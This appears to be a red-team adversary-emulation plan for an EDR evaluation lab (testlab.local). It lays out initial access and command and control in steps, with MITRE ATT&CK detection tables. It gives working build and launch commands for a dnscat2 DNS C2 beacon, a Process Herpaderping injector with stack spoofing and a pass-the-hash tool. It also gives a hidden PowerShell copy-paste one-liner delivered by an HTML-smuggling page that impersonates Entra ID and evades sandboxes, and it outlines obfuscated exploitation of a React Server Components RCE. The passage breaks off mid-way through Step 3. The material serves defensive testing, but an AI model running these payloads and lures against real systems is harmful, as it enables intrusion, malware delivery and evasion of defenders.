# Phase 1 — Initial Access & Command and Control

## Overview

The attacker targets an internal IIS server that hosts two separate web applications: `upload.testlab.local` and `react.testlab.local`. Both applications present distinct exploitation paths that are pursued in parallel.

On the first path, the attacker abuses an unrestricted file upload feature on `upload.testlab.local` to host a malicious HTML page. A targeted employee on a domain workstation is lured to visit the page, which silently delivers a dropper through a copy-paste interaction. The dropper fetches a C2 beacon and a process injector, establishing a covert dnscat2 channel over DNS from the workstation.

On the second path, the attacker directly exploits a React Server Components deserialization vulnerability (CVE-2025-55182) on `react.testlab.local` to achieve unauthenticated RCE on the IIS server itself, then escalates to `NT AUTHORITY\SYSTEM` via `SeImpersonatePrivilege`.

---

## Step 0 - Setup

### Procedures

- ☣️ On the attacker machine, start the dnscat2 server listener

  ```bash
  ruby dnscat2.rb --dns "domain=attacker.local,host=0.0.0.0" --security=open --secret=c7517dee4fcbe16a0c8c1f98cdc5ce4e
  ```

  - ***Expected Output***

    ```text
    New window created: 0
    dnscat2> Listening for connections...
    ```

- ☣️ Build `dnscat2.exe` (Go client) — domain mode, DNS resolver auto-detected from victim's registry

  `getSystemDNS()` performs a two-pass registry scan: static `NameServer` entries across all
  interfaces are collected before any DHCP-assigned entries. This ensures that on DC01 (Phase 3),
  the client resolves through `127.0.0.1` (DC's own DNS, Ethernet 3 static) which carries the
  conditional forwarder for `attacker.local → 192.168.56.2`, rather than falling back to a
  DHCP-assigned upstream DNS on the NAT adapter.

  ```bash
  cd resources/payloads/dnscat2/go-client
  GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
    -X main.DefaultDomain=attacker.local \
    -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
    -o dnscat2.exe ./cmd/dnscat/
  ```

  Output binary: `resources/payloads/dnscat2/go-client/dnscat2.exe`

- ☣️ Build `CWLHerpaderping.exe` from source with static CRT and correct payload drop path

  The Release|x64 configuration is set to `<RuntimeLibrary>MultiThreaded</RuntimeLibrary>` (`/MT`)
  so the binary is fully self-contained. This is required for Phase 3 execution on DC01, which does
  not have the Visual C++ Redistributable installed (`VCRUNTIME140.dll` unavailable).

  ```powershell
  cd resources\payloads\CWLHerpaderping
  msbuild CWLHerpaderping.sln `
    /p:Configuration=Release `
    /p:Platform=x64 `
    /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" `
    /t:Rebuild /m
  ```

  Output binary: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`

- ☣️ Build `go-thehash.exe` — Pass-the-Hash SMB file transfer and remote service execution tool

  Used in Phase 3 to authenticate to DC01 via raw NT hash, transfer payloads over `C$`, and
  trigger execution via a transient MS-SCMR service — without touching Windows SSPI or Kerberos.

  ```bash
  cd resources/payloads/go-thehash
  GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o go-thehash.exe .
  ```

  Output binary: `resources/payloads/go-thehash/go-thehash.exe`

- ☣️ Encode Phase 3 payloads for react2shell chunked upload to IIS01

  ```bash
  cd resources/payloads/react2shell-tool
  python encode_payload.py ../dnscat2/go-client/dnscat2.exe                        -o dnscat2.b64          -l 0
  python encode_payload.py ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe      -o CertEnrollAgent.b64  -l 0
  python encode_payload.py ../go-thehash/go-thehash.exe                            -o go-thehash.b64       -l 0
  ```

- ☣️ Regenerate `staging.html` with the latest payload embedded

  ```bash
  cd resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/
  python encode-command.py
  ```

  - ***Expected Output***

    ```text
    [+] stage1.hta -> cert_bundle.txt
        Original : 4,xxx bytes
        PEM      : 6,xxx bytes

    [+] Smuggled payload -> staging.html (x,xxx b64 chars)

    --- paste into Win+R ---
    powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\cert_bundle.txt')"
    ```


---

## Step 1 - Initial Access: Drive-by Compromise via HTML Smuggling

### Voice Track

The attacker sends a targeted link to `http://upload.testlab.local/uploads/staging.html`
to a domain user on a workstation. The page impersonates a **Microsoft Entra ID
certificate compliance portal**, displaying a spinner that reads "Checking device
compliance status..." while it runs several passive environment checks in the
background — minimum viewport **1000×700**, at least **one** browser plugin,
and a non-empty **timezone other than UTC** — to reduce execution in headless,
minimal, or default-sandbox browsers. The lure script also accumulates a client-side
**user-activity score** from `mousemove` (+1) and `keydown` (+3); after a fixed
**5-second** wait, the page only reveals the remediation UI and drops the file if
that score reaches **10** and all system checks still pass. If the page is opened on
the wrong hostname it redirects to a benign Microsoft sign-in URL (lab staging only).

If all gates pass, the page silently reconstructs a file called `cert_bundle.txt`
from a base64 payload embedded directly inside the HTML and saves it to the user's
`Downloads` folder without issuing any additional outbound HTTP request. This bypasses
proxy or DLP controls that inspect file downloads by filename or MIME type.

The page then presents a two-step instruction overlay styled as a compliance
remediation guide. It instructs the user to press **Win+R**, paste a provided
PowerShell command, and press Enter. The command is pre-loaded into the clipboard
the moment the overlay appears. Pressing Copy re-copies the same command and
confirms success visually.

The command reads `cert_bundle.txt` and executes it via `iex(gc -Raw ...)`. The
file is a polyglot: it appears to be a PEM certificate bundle on the surface, but the
PEM header and footer are wrapped in a PowerShell block comment, making the
base64 content invisible to the PowerShell interpreter. Only the decoder script
at the end of the file is executed. That script extracts the embedded HTA bytes,
drops them as a `.bin` file in `%TEMP%`, renames the file to `.hta`, and
launches it via `mshta.exe`.

### Procedures

- ☣️ Upload required files to `upload.testlab.local` via the file upload interface

  | File | Upload path |
  | - | - |
  | `staging.html` | `/uploads/staging.html` |
  | `dnscat2.exe` | `/uploads/dnscat2.exe` |
  | `CWLHerpaderping.exe` | `/uploads/CWLHerpaderping.exe` |

- ☣️ Verify the lure page is reachable from a browser that resolves
  `upload.testlab.local` to the staging server

  ```
  http://upload.testlab.local/uploads/staging.html
  ```

- Deliver the lure URL `http://upload.testlab.local/uploads/staging.html` to the
  victim user via internal communication (chat, email, or redirected intranet page)

- On the victim workstation, open the URL in the browser

- During the 5-second spinner, interact lightly with the page (mouse movement or
  keyboard input) so the client-side activity score crosses the threshold

- Observe: after the delay and gates succeed, `cert_bundle.txt` is automatically
  saved to `%USERPROFILE%\Downloads\`

- On the victim workstation, follow the on-screen instructions:
  press **Win+R**, paste the command displayed on the page, press **Enter**

- ☣️ Observe on the victim workstation that `powershell.exe` is spawned with
  `-w h -ep bypass` flags and reads `cert_bundle.txt`

- ☣️ Observe that `mshta.exe` is launched with a `.hta` file from `%TEMP%`

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST multipart file upload to `upload.testlab.local` upload interface deposits attacker-controlled files in `/uploads/`; no authentication required; server accepts arbitrary file types | Not Calibrated - Not Benign | Attacker exploits unrestricted file upload vulnerability on `upload.testlab.local` to stage `staging.html`, `dnscat2.exe`, and `CWLHerpaderping.exe` on victim infrastructure | upload.testlab.local | attacker | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | Files `staging.html`, `dnscat2.exe`, `CWLHerpaderping.exe` appear in `/uploads/` on `upload.testlab.local` via multipart POST; no prior authentication or session | Not Calibrated - Not Benign | Attacker transfers malware and lure page from attacker machine into victim environment via file upload vulnerability | upload.testlab.local | attacker | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html), [dnscat2.exe](../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
| Initial Access | T1189 | Drive-by Compromise | Windows | `msedge.exe`/`chrome.exe`/`iexplore.exe` connects to `http://upload.testlab.local/uploads/staging.html` and initiates client-side file assembly | Not Calibrated - Not Benign | Victim visits lure page uploaded by attacker to victim-owned `upload.testlab.local`, masquerading as Entra ID certificate portal — **Not Calibrated** on two grounds: (1) Condition 4 fail — browser navigating to an internal hostname produces a network connection log indistinguishable from normal browsing; fair scoring would require URL reputation or content inspection outside EDR telemetry scope; (2) Câu B Downstream — the browser visit is the upstream mechanism for **T1027.006** (Calibrated); if vendor detects the file write downstream they have already observed the outcome of this step | victim-workstation | domain user | [staging.html](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1027.006 | Obfuscated Files or Information: HTML Smuggling | Windows | `msedge.exe` / `chrome.exe` writes `%USERPROFILE%\Downloads\cert_bundle.txt` without issuing a corresponding HTTP GET request for the file | Calibrated - Not Benign | `staging.html` reconstructs `cert_bundle.txt` from base64 blob embedded in the HTML; no server request for the file | victim-workstation | domain user | [staging.html triggerDownload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `cert_bundle.txt` contains base64-encoded content structured between PEM `-----BEGIN CERTIFICATE-----` / `-----END CERTIFICATE-----` delimiters, concealing an HTA payload inside a file that appears to be a legitimate certificate bundle | Not Calibrated - Not Benign | Static encoding layout inside the polyglot file; same observable outcome is covered by **T1036.008** (misleading type) and **T1140** (decode at execution) which map cleanly to file-create + process/script telemetry per detection notes | victim-workstation | domain user | [encode-command.py encode_pem()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1497.001 | Virtualization/Sandbox Evasion: System Checks | Windows | No reveal/download when `environmentBlocksPayload()` is true: `screen.width < 1000` or `screen.height < 700`, `navigator.plugins.length === 0`, or timezone missing/`UTC`; passive checks in page script only; `triggerDownload()` not called | Not Calibrated - Not Benign | Checks run entirely inside the browser JS context — no distinct endpoint telemetry (process/registry/script-block) for “sandbox detected”; only indirect outcome is absence of `cert_bundle.txt`, which is ambiguous on EDR and overlaps the scored **T1027.006** download path. Aligns with methodology: internal guard/evasion logic is **Not Calibrated** for Scenario 1 | upload.testlab.local, victim-workstation | domain user | [staging.html environmentBlocksPayload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1497.002 | Virtualization/Sandbox Evasion: User Activity Based Checks | Windows | After `REVEAL_DELAY_MS` (5000), reveal and `triggerDownload()` run only if `userSignals >= USER_SIGNALS_MIN` (10); `mousemove` adds 1 and `keydown` adds 3 per event; static automated sessions often stay below threshold | Not Calibrated - Not Benign | Same rationale as **T1497.001**: `userSignals` is in-page state only — vendors cannot fairly be scored on “missed sandbox evasion” without telemetry attributable to this technique; kept for ATT&CK completeness, not denominator | victim-workstation | domain user | [staging.html userSignals / USER_SIGNALS_MIN](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1678 | Delay Execution | Windows | Fixed `REVEAL_DELAY_MS = 5000` between navigation and evaluation of user-activity + system gates; delay has no dedicated endpoint syscall/log line separate from browser timing | Not Calibrated - Not Benign | Spinner UX aligns with **T1678** (timed deferral) but EDR scoring lacks a standalone observable aside from correlating page-load time to later file events — treated as implementation detail of the gated reveal | upload.testlab.local, victim-workstation | domain user | [staging.html REVEAL_DELAY_MS](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `browser` process writes `%USERPROFILE%\Downloads\cert_bundle.txt`; filename chosen to approximate the name of a legitimate certificate export, reducing suspicion if seen in the Downloads folder | Not Calibrated - Not Benign | Payload file named `cert_bundle.txt` to approximate a legitimate certificate bundle filename; naming aspect is distinct from the polyglot file-type masquerade scored under T1036.008 | victim-workstation | domain user | [staging.html triggerDownload()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Execution | T1204.004 | User Execution: Malicious Copy and Paste | Windows | `explorer.exe` spawns `powershell.exe` with command line containing `-w h -ep bypass -c "iex(gc -Raw ...)"` (indicates Win+R Run execution) | Calibrated - Not Benign | Lure page pre-loads PowerShell one-liner into clipboard; user instructed to open Win+R, paste, and press Enter | victim-workstation | domain user | [staging.html buildCommand()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/staging.html) | -
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `powershell.exe` executes with arguments `-w h -ep bypass -c "iex(gc -Raw '...\cert_bundle.txt')"` | Calibrated - Not Benign | User pastes and runs the PowerShell command from Win+R | victim-workstation | domain user | [encode-command.py build_ps_command()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `powershell.exe` reads `%USERPROFILE%\Downloads\cert_bundle.txt`, reconstructs base64 from PEM lines, and decodes via `Security.Cryptography.FromBase64Transform` into a memory stream (follow-on file write to `%TEMP%`) | Calibrated - Not Benign | Primary scored decode step: aligns with Windows detection guidance (process + script + staged file read/write chain) | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1036.008 | Masquerading: Masquerade File Type | Windows | `powershell.exe` writes `%TEMP%\hpsolutionsportal.bin` and renames it to `%TEMP%\hpsolutionsportal.hta` | Calibrated - Not Benign | Payload written with `.bin` extension before rename to `.hta` to mask file type during staging; filename `hpsolutionsportal` chosen to resemble a legitimate portal application | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1218.005 | System Binary Proxy Execution: Mshta | Windows | `powershell.exe` spawns `mshta.exe` with `%TEMP%\hpsolutionsportal.hta` as argument | Calibrated - Not Benign | PowerShell executes `mshta.exe` against the dropped HTA file | victim-workstation | domain user | [encode-command.py build_ps_embed()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -
| Defense Evasion | T1036.008 | Masquerading: Masquerade File Type | Windows | `powershell.exe` reads and executes script content from `%USERPROFILE%\Downloads\cert_bundle.txt` (mismatched `.txt` extension) | Calibrated - Not Benign | **Scored** masquerade row: MIME/extension imply certificate bundle while interpreter treats content as PowerShell; richest single artifact tie-in among **T1027.013 / T1036.008 / T1140** for file metadata + execution correlation | victim-workstation | domain user | [encode-command.py encode_pem()](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py) | -

---

## Step 2 - Execution & Command and Control: HTA dropper + dnscat2 via Process Herpaderping

### Voice Track

Once `mshta.exe` loads `hpsolutionsportal.hta`, the embedded VBScript runs
entirely in memory. The HTA is declared with `WINDOWSTATE="minimize"` and
`SHOWINTASKBAR="no"`, so the window is intended to remain non-interactive and
absent from the taskbar. After execution completes, a `window.setTimeout
"self.close", 5000` call closes the process after five seconds.

The script performs two sequential downloads from `upload.testlab.local`. First,
it fetches the dnscat2 C2 beacon (`dnscat2.exe`) and saves it to
`C:\ProgramData\CertCA.bin`, a path that requires no elevated privileges to
write. Second, it fetches the process injector (`CWLHerpaderping.exe`), writes it
to `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`, and renames it to
`CertEnrollAgent.exe` before executing it with a hidden window — again using the
`.bin`-then-rename pattern to suppress write-time detection.

`CertEnrollAgent.exe` implements **Process Herpaderping**: it reads
`C:\ProgramData\CertCA.bin` into memory, immediately deletes the file from disk
to remove forensic evidence, writes the bytes into a temporary file in `%TEMP%`,
and creates an image section from that file with `NtCreateSection`.

Before creating the ghost process, `GetNonJobParent()` enumerates running processes
and selects an accessible `svchost.exe` or `wininit.exe` instance in Session 0 —
verified via `ProcessIdToSessionId` — as the parent handle passed to
`NtCreateProcessEx`. This places the ghost in Session 0, typically with
`svchost.exe` as its visible parent in the process tree, regardless of which users
are currently logged in. In this workstation path there is no privilege escalation:
`CertEnrollAgent.exe` runs as the domain user, and the ghost token is reassigned
to a duplicate of that same caller token. Spoofing to interactive-session
processes such as `explorer.exe` can trigger session or token-context anomalies
when the ghost token is corrected after creation.

After the ghost is created, `NtSetInformationProcess(ProcessAccessToken)` is called
with a duplicate of the calling process's primary token, overriding the inherited
parent token. At this point — after the section is already mapped and the ghost
process exists, but before the payload thread starts — the temporary file on disk
is overwritten with benign content. Any forensic tool or EDR that reads the file
after the fact sees only garbage. The ghost process is then given fake parameters
identifying it as `C:\Windows\System32\RuntimeBroker.exe`, and a thread is started
at the payload entry point via `NtCreateThreadEx`.

All five sensitive NT API calls (`NtCreateSection`, `NtCreateProcessEx`,
`NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) are
wrapped with a call-stack spoofer that plants a fake return address inside
`kernel32.dll` before each call, defeating user-mode stack-walk inspection by EDR
sensors.

The dnscat2 beacon starts and connects back to the attacker-controlled DNS
server, tunnelling C2 traffic over DNS queries encrypted with session keys
derived from ECDH; the pre-shared secret configured at setup is used for
authenticator verification.

### Procedures

- ☣️ Observe on the victim workstation that `mshta.exe` connects to
  `http://upload.testlab.local/uploads/dnscat2.exe` and
  `http://upload.testlab.local/uploads/CWLHerpaderping.exe`

- ☣️ Observe that `C:\ProgramData\CertCA.bin` is created, then deleted
  shortly after `CertEnrollAgent.exe` starts

- ☣️ Observe that `CertEnrollAgent.exe` creates a process whose image path
  reports as `C:\Windows\System32\RuntimeBroker.exe` but whose on-disk image
  does not match the in-memory content

- ☣️ Switch to the attacker machine and confirm the dnscat2 session appears

  ```text
  dnscat2> New session established: <session-id>
  dnscat2> session -i <session-id>
  ```

- ☣️ Verify command execution inside the C2 session

  ```text
  command (victim-workstation) 1> shell
  command (victim-workstation) 1> whoami
  ```

  - ***Expected Output***

    ```text
    testlab\<domain-user>
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Execution | T1059.005 | Command and Scripting Interpreter: Visual Basic | Windows | `mshta.exe` executes embedded VBScript from `hpsolutionsportal.hta`; script instantiates `MSXML2.XMLHTTP`, `ADODB.Stream`, `Scripting.FileSystemObject`, and `Shell.Application` COM objects to fetch, write, rename, and execute binaries | Calibrated - Not Benign | HTA embeds VBScript that runs within `mshta.exe`; script-host execution telemetry is independent of file creation (T1105) — detection axis is interpreter execution vs. file I/O | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `mshta.exe` writes binary content to `C:\ProgramData\CertCA.bin` and `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin` via `ADODB.Stream.SaveToFile` | Calibrated - Not Benign | HTA dropper fetches and drops dnscat2 beacon and Herpaderping loader to disk | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `mshta.exe` creates `%APPDATA%\Microsoft\Windows\CertEnrollAgent.bin`, renamed to `CertEnrollAgent.exe` — path and name associated with legitimate Windows Certificate Enrollment components | Calibrated - Not Benign | Herpaderping loader placed under `%APPDATA%\Microsoft\Windows\` with `CertEnrollAgent.exe` name mimicking Windows certificate enrollment service; detection axis distinct from T1105 (file creation) | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Defense Evasion | T1055 | Process Injection | Windows | **[Duplicate of Step 3]** Process whose `ImageFileName` is `RuntimeBroker.exe` but whose mapped image section does not match the file at that path on disk; PPID resolves to a Session 0 `svchost.exe` or `wininit.exe` instance | Not Calibrated - Not Benign | `CertEnrollAgent.exe` (CWLHerpaderping) creates a ghost process: section mapped from dnscat2, PPID spoofed to an accessible Session 0 parent via `GetNonJobParent()` with `ProcessIdToSessionId` filter, then on-disk temp file overwritten with junk before the payload thread starts | victim-workstation | domain user | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | **[Duplicate of Step 3]** Ghost process PPID resolves to a Session 0 `svchost.exe` or `wininit.exe` instance rather than `CertEnrollAgent.exe` | Not Calibrated - Not Benign | `GetNonJobParent()` enumerates processes, filters to Session 0 only via `ProcessIdToSessionId`, opens the first accessible `svchost.exe` or `wininit.exe` with `PROCESS_CREATE_PROCESS`, passes handle to `NtCreateProcessEx` as parent | victim-workstation | domain user | [CWLImplant.cpp GetNonJobParent()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1134 | Access Token Manipulation | Windows | `CertEnrollAgent.exe` calls `NtSetInformationProcess` with class `ProcessAccessToken` on the ghost process handle, assigning a duplicate of its own domain-user primary token | Not Calibrated - Not Benign | After ghost process creation via `NtCreateProcessEx`, `CertEnrollAgent.exe` duplicates its own primary token and assigns it to the ghost via `NtSetInformationProcess(ProcessAccessToken)` — preventing token-context mismatch caused by inheriting the Session 0 parent process token rather than the caller's domain-user token. Unlike Step 3, this does not elevate to SYSTEM | victim-workstation | domain user | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | **[Duplicate of Step 3]** `C:\ProgramData\CertCA.bin` deleted immediately after being read into memory by `CertEnrollAgent.exe` | Not Calibrated - Not Benign | Herpaderping deletes the payload file from disk after reading it to remove forensic evidence | victim-workstation | domain user | [CWLImplant.cpp GetPayloadBuffer()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | **[Duplicate of Step 3]** Ghost process `ImageFileName` resolves to `C:\Windows\System32\RuntimeBroker.exe` despite mapping a different in-memory image | Not Calibrated - Not Benign | CWLHerpaderping spawns ghost process with spoofed image path `RuntimeBroker.exe` to blend with legitimate Windows processes | victim-workstation | domain user | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | **[Duplicate of Step 3]** Unusual volume of DNS queries from workstation to `attacker.local`; queries contain encoded subdomain labels characteristic of dnscat2 | Not Calibrated - Not Benign | dnscat2 beacon tunnels C2 traffic over DNS queries to attacker-controlled nameserver | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | dnscat2 ghost process (`RuntimeBroker.exe`) emits DNS queries whose subdomain payloads are encrypted with session keys derived from ECDH P-256 key exchange; traffic is opaque to DNS inspection | Not Calibrated - Not Benign | dnscat2 performs ECDH P-256 key exchange then encrypts C2 traffic with Salsa20 stream cipher; pre-shared secret used for HMAC authenticator verification — distinct detection axis from T1071.004 (DNS query pattern/volume) | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe) | -
| Discovery | T1012 | Query Registry | Windows | **[Duplicate of Step 3]** Registry key `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer` read via `RegOpenKeyEx` / `RegEnumKeyEx` / `RegQueryValueEx` by the dnscat2 ghost process (`RuntimeBroker.exe`) | Not Calibrated - Not Benign | dnscat2 enumerates all TCP/IP interface GUIDs and reads `NameServer` / `DhcpNameServer` registry values to discover the DNS resolver to use for C2 domain tunneling | victim-workstation | domain user | [getdns_windows.go getSystemDNS()](../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` (CWLHerpaderping) resolves `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` via `GetProcAddress` from `ntdll.dll` at runtime; none appear in the binary's static import table; API names resolved dynamically to avoid IAT-based detection | Not Calibrated - Not Benign | CWLHerpaderping calls `GetProcAddress` to resolve all five injection-critical NT APIs at runtime rather than importing them statically — the binary's IAT contains no references to these functions, making them invisible to static import analysis | victim-workstation | domain user | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` has its Go symbol table and DWARF debug information stripped; `CWLHerpaderping.exe` (deployed as `CertEnrollAgent.exe`) is a Visual C++ release build with no useful debug metadata exposed to responders | Not Calibrated - Not Benign | dnscat2 is compiled with Go release flags that omit symbol and DWARF debug information, while CWLHerpaderping is deployed as a release-built C++ loader renamed to `CertEnrollAgent.exe` | victim-workstation | domain user | [dnscat2.exe](../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
| Execution | T1106 | Native API | Windows | `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx` resolved dynamically via `GetProcAddress` from `ntdll.dll`; all five wrapped with stack spoofer planting fake return address inside `kernel32.dll` | Not Calibrated - Not Benign | CWLHerpaderping (`CertEnrollAgent.exe`) calls NT native APIs directly from `ntdll.dll` to create the ghost process; the five injection-critical calls are stack-spoofed to evade user-mode call stack inspection | victim-workstation | domain user | [CWLImplant.cpp](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `mshta.exe` terminates its own window after 5 seconds; `mshta.exe` spawns `CertEnrollAgent.exe` with `SW_HIDE` (nShow=0) flag | Not Calibrated - Not Benign | HTA `stage1.hta` declares `WINDOWSTATE="minimize"` and `SHOWINTASKBAR="no"` to keep the window minimized and absent from the taskbar; `window.setTimeout "self.close", 5000, "VBScript"` closes process after execution; `CertEnrollAgent.exe` spawned via `Shell.Application.ShellExecute` with `nShow=0` | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Windows | `mshta.exe` connects to `upload.testlab.local:80` via HTTP; GET requests to `/uploads/dnscat2.exe` and `/uploads/CWLHerpaderping.exe` issued before file creation events | Calibrated - Not Benign | HTA VBScript uses `MSXML2.XMLHTTP` to perform outbound HTTP GET requests from victim workstation to `upload.testlab.local` to fetch dnscat2 and Herpaderping loader — distinct detection axis from T1105 (file creation event) | victim-workstation | domain user | [stage1.hta](../resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/stage1.hta) | -
| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | **[Duplicate of Step 3]** Ghost process `ImageFileName` is `C:\Windows\System32\RuntimeBroker.exe`; `ProcessParameters.ImagePathName` and `CommandLine` both point to `RuntimeBroker.exe` | Not Calibrated - Not Benign | `CWLHerpaderping` calls `RtlCreateProcessParametersEx` to build a fake `RTL_USER_PROCESS_PARAMETERS` block with `ImagePathName = RuntimeBroker.exe`; a single `WriteProcessMemory` installs the pointer into the ghost PEB — any tool reading `NtQueryInformationProcess(ProcessParameters)` from the ghost sees the spoofed path and command line | victim-workstation | domain user | [CWLImplant.cpp Herpaderping()](../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -

> **Note:** Rows marked `[Duplicate of Step 3]` use identical binaries (`CWLHerpaderping.exe`, `dnscat2.exe`) and exhibit the same observable behavior as Step 3, but differ in host and token context: Step 2 runs on `victim-workstation` as the domain user and performs no privilege escalation, while Step 3 runs on `react.testlab.local` after EfsPotato starts `CertEnrollAgent.exe` as `NT AUTHORITY\SYSTEM`. These Step 2 rows are marked `Not Calibrated` to avoid double-counting the same detection capability; Step 3 is prioritized for scoring due to higher impact (SYSTEM-level compromise on server) and more diverse post-exploitation chain.

---

## Step 3 - Server-Side RCE & Privilege Escalation: React Server Components Exploitation (CVE-2025-55182)

### Voice Track

While the workstation attack path runs concurrently via `upload.testlab.local`,
the attacker separately exploits `react.testlab.local` — a Next.js application
running on the same IIS server under `iisnode`. The server exposes a React
Server Components (RSC) endpoint that deserializes untrusted flight data and
passes it directly into a `Promise.resolve()` call without validation. By
crafting a multipart POST request that contains a malicious RSC payload, the
attacker manipulates the `__proto__.then` chain of a resolved model to inject
an arbitrary JavaScript string into the `_prefix` field of the response object.
When the vulnerable RSC/iisnode execution path evaluates this field, the injected code runs with the privileges
of the IIS Application Pool identity (`IIS APPPOOL\react.testlab.local`).

This gives the attacker direct unauthenticated code execution on the IIS
server host — no workstation pivot or lateral movement required. The attacker
exploits this code execution primitive through two layers. For file operations
(write, append, decode, read), `process.mainModule.require('fs')` calls are
wrapped in `eval(String.fromCharCode(...))` — no child process is spawned at
all. For binary execution, `eval` is used with
`child_process.spawn(..., {detached:true, stdio:'ignore'}).unref()`, which
launches the target process detached from the iisnode worker, immediately
returns control to the web request, and keeps the react2shell session fully
alive — no `cmd.exe` is involved and no web request is blocked. All `fs` calls
and spawn arguments are obfuscated as charcode arrays to evade string-based
detection in server logs. Pre-encoded base64 payloads are transferred to the
server in 2,000-character chunks and decoded in-place via `Buffer.from(..., 'base64')`.

